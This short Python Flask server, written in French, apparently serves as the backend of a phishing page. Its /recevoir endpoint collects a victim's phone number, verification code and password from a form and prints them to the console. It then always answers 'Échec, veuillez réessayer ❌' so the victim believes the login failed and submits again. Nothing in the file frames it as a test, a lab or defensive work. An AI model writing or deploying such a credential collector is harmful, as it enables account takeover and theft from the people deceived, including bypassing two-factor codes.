from flask import Flask, request

app = Flask(__name__)

@app.route("/")
def accueil():
    return "Serveur Flask actif."

@app.route("/recevoir", methods=["POST"])
def recevoir():
    numéro_de_téléphone= request.form.get("numéro_de_téléphone")
    code= request.form.get("code")
    mot_de_passe = request.form.get("mot_de_passe")

    print("numéro de téléphone :", numéro_de_téléphone)
    print("code :", code)
    print("mot de passe:", mot_de_passe)

    return "Échec, veuillez réessayer ❌"
